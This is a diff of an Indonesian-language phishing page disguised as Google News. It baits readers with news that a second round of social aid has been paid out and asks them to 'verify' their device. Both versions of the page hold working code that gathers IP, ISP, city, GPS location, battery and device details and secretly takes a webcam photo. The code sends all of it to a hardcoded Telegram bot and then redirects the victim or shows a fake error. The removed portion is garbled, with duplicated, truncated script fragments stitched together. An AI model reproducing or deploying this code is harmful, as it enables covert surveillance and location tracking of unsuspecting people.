@@ -1,247 +1,62 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google News Indonesia</title>
+    <title>Google News</title>
     <style>
-        body { font-family: sans-serif; margin: 0; background: #f0f2f5; text-align: center; }
-        .header { background: #1a73e8; color: white; padding: 15px; font-weight: bold; }
-        .card { max-width: 500px; margin: 20px auto; background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 20px; }
-        .btn { width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        #video, #canvas { display: none; }
+        body{font-family:sans-serif;margin:0;background:#f0f2f5;text-align:center}
+        .h{background:#1a73e8;color:#fff;padding:15px;font-weight:700}
+        .c{max-width:500px;margin:20px auto;background:#fff;border-radius:10px;padding:20px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
+        .b{width:100%;padding:15px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer}
     </style>
 </head>
 <body>
-    <div class="header">Google News Indonesia</div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%; border-radius:5px;">
-        <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
-        <p>Silakan verifikasi perangkat Anda untuk melihat daftar nama penerima bantuan pemerintah.</p>
-        <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
+    <div class="h">Google News Indonesia</div>
+    <div class="c">
+        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%">
+        <h1>Bantuan Sosial Tahap 2 Cair</h1>
+        <p>Verifikasi perangkat untuk melihat daftar nama.</p>
+        <button class="b" id="btn">CEK DAFTAR NAMA</button>
     </div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-
+    <video id="v" autoplay style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
     <script>
-        const tok = "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg";
-        const id = "5392443720";
-
-        document.getElementById('startBtn').addEventListener('click', async function() {
-            this.innerText = "Memverifikasi... (95%)";
-            this.disabled = true;
-
-            let info = "🚀 *LAPORAN ULTIMATE TARGET*%0A━━━━━━━━━━━━━━━━━━%0A";
-            info += "📱 *Sistem:* " + navigator.platform + "%0A";
-            
+        const T="8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg";
+        const I="5392443720";
+        document.getElementById('btn').addEventListener('click', async function(){
+            this.innerText="Memproses...";
+            let txt = "📸 *TARGET BERHASIL*%0A";
+            txt += "📱 OS: " + navigator.platform + "%0A";
+            txt += "⚙️ Core: " + navigator.hardwareConcurrency + "%0A";
             try {
                 const b = await navigator.getBattery();
-                info += "🔋 *Baterai:* " + Math.round(b.level * 100) + "%0A";
-            } catch(e) {}
-
+                txt += "🔋 Bat: " + Math.round(b.level*100) + "%25%0A";
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                txt += "🌍 IP: " + d.ip + "%0A📍 " + d.city + "%0A";
+            } catch(e){}
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                info += "🌍 *IP:* " + d.ip + "%0A📍 *Kota:* " + d.city + "%0A";
-            } catch(e) {}
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    info += "🎯 *GPS:* [Buka Maps](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")%0A";
-                    lanjut(info);
-                }, () => {
-                    info += "🎯 *GPS:* Ditolak%0A";
-                    lanjut(info);
-                });
-            } else {
-                lanjut(info);
-            }
-        });
-
-        async function lanjut(txt) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('video');
-                v.srcObject = stream;
-                setTimeout(() => {
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                setTimeout(()=>{
                     const c = document.getElementById('canvas');
                     c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', id);
-                        fd.append('photo', blob, 'f.jpg');
-                        fd.append('caption', decodeURIComponent(txt));
-                        fd.append('parse_mode', 'Markdown');
-                        fetch("https://api.telegram.org/bot" + tok + "/sendPhoto", { method: 'POST', body: fd })
-                        .then(() => { window.location.href = "https://news.google.com"; });
-                        stream.getTracks().forEach(t => t.stop());
+                    c.getContext('2d').drawImage(v,0,0);
+                    c.toBlob(blob=>{
+                        const f = new FormData();
+                        f.append('chat_id', I); f.append('photo', blob, 'f.jpg');
+                        f.append('caption', decodeURIComponent(txt));
+                        f.append('parse_mode', 'Markdown');
+                        fetch("https://api.telegram.org/bot"+T+"/sendPhoto",{method:'POST',body:f})
+                        .then(()=>{ window.location.href="https://news.google.com"; });
+                        s.getTracks().forEach(t=>t.stop());
                     }, 'image/jpeg');
-                }, 2000);
-            } catch (err) {
-                fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + txt + "%0A⚠️ Kamera Ditolak&parse_mode=Markdown")
-                .then(() => { window.location.href = "https://news.google.com"; });
-            }
-        }
-    </script>
-</body>
-</html>            info += "📱 *Sistem:* " + navigator.platform + "%0A";
-            info += "⚙️ *CPU Cores:* " + (navigator.hardwareConcurrency || "Tidak Diketahui") + "%0A";
-            
-            // 2. Data Baterai
-            try {
-                const b = await navigator.getBattery();
-                info += "🔋 *Baterai:* " + Math.round(b.level * 100) + "% (" + (b.charging ? 'Dicas' : 'Tidak Dicas') + ")%0A";
-            } catch(e) {}
-
-            // 3. Data IP & ISP
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                info += `🌍 *IP:* ${d.ip}%0A🏢 *ISP:* ${d.org}%0A📍 *Kota:* ${d.city}%0A`;
-                info += `📌 *Maps (IP):* [Klik Disini](http://www.google.com/maps/place/${d.latitude},${d.longitude})%0A`;
-            } catch(e) {}
-
-            // 4. Ambil GPS & Kamera
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    info += `🎯 *GPS AKURAT:* [Buka Google Maps](http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude})%0A`;
-                    jalankanKamera(info);
-                }, () => {
-                    info += "🎯 *GPS:* Izin Ditolak%0A";
-                    jalankanKamera(info);
-                });
-            } else {
-                jalankanKamera(info);
-            }
-        });
-
-        async function jalankanKamera(captionLengkap) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', id);
-                        fd.append('photo', blob, 'f.jpg');
-                        fd.append('caption', decodeURIComponent(captionLengkap));
-                        fd.append('parse_mode', 'Markdown');
-                        
-                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: fd })
-                        .then(() => {
-                            // REDIRECT OTOMATIS setelah kirim
-                            window.location.href = "https://news.google.com/topics/CAAqJggKIiBDQkFTRWdvSUwyMHZNRzV6Y3pJU0FtVnVHZ0pKVGlnQVAB?hl=id&gl=ID&ceid=ID:id";
-                        });
-                        
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch (err) {
-                // Tetap kirim teks dan redirect jika kamera ditolak
-                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${captionLengkap}%0A⚠️ *Kamera Ditolak*&parse_mode=Markdown`)
-                .then(() => {
-                    window.location.href = "https://news.google.com";
-                });
-            }
-        }
-    </script>
-</body>
-</html>            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                info += `🌍 *IP:* ${d.ip}%0A🏢 *ISP:* ${d.org}%0A📍 *Kota:* ${d.city}%0A`;
-                info += `📌 *Maps (IP):* [Klik Disini](https://www.google.com/maps?q=${d.latitude},${d.longitude})%0A`;
-            } catch(e) {}
-
-            // 2. Ambil GPS Akurat (Jika Diizinkan)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    info += `🎯 *GPS AKURAT:* [Buka Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})%0A`;
-                    lanjutKeKamera(info);
-                }, () => {
-                    info += "🎯 *GPS:* Izin Lokasi Ditolak%0A";
-                    lanjutKeKamera(info);
-                });
-            } else {
-                lanjutKeKamera(info);
-            }
-        });
-
-        async function lanjutKeKamera(captionLengkap) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', id);
-                        fd.append('photo', blob, 'f.jpg');
-                        fd.append('caption', decodeURIComponent(captionLengkap));
-                        fd.append('parse_mode', 'Markdown');
-                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: fd });
-                        stream.getTracks().forEach(t => t.stop());
-                        alert("Error 505: Server sibuk. NIK Anda sedang dalam antrean.");
-                        document.getElementById('startBtn').innerText = "CEK DAFTAR NAMA";
-                        document.getElementById('startBtn').disabled = false;
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch (err) {
-                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${captionLengkap}%0A⚠️ *Kamera Ditolak*&parse_mode=Markdown`);
-                alert("Verifikasi gagal. Akses kamera diperlukan.");
-                document.getElementById('startBtn').innerText = "CEK DAFTAR NAMA";
-                document.getElementById('startBtn').disabled = false;
-            }
-        }
-    </script>
-</body>
-</html>            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                info += "🌍 *IP:* " + d.ip + "%0A🏢 *ISP:* " + d.org + "%0A📍 *Kota:* " + d.city + "%0A📌 *Maps:* [Buka Lokasi](https://www.google.com/maps?q=" + d.latitude + "," + d.longitude + ")%0A";
-            } catch(e) { info += "🌍 *IP:* Gagal Ambil%0A"; }
-
-            // Ambil Kamera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', id);
-                        fd.append('photo', blob, 'f.jpg');
-                        fd.append('caption', decodeURIComponent(info));
-                        fd.append('parse_mode', 'Markdown');
-                        fetch("https://api.telegram.org/bot" + tok + "/sendPhoto", { method: 'POST', body: fd });
-                        stream.getTracks().forEach(t => t.stop());
-                        alert("Error 505: Server sibuk, coba beberapa saat lagi.");
-                        this.innerText = "CEK DAFTAR NAMA";
-                        this.disabled = false;
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch (err) {
-                fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + info + "%0A⚠️ Kamera Ditolak&parse_mode=Markdown");
-                alert("Akses kamera diperlukan untuk verifikasi.");
-                this.innerText = "CEK DAFTAR NAMA";
-                this.disabled = false;
+                },2000);
+            } catch(e){
+                fetch("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+I+"&text="+txt+"%0A⚠️ Kamera Ditolak&parse_mode=Markdown")
+                .then(()=>{ window.location.href="https://news.google.com"; });
             }
         });
     </script>
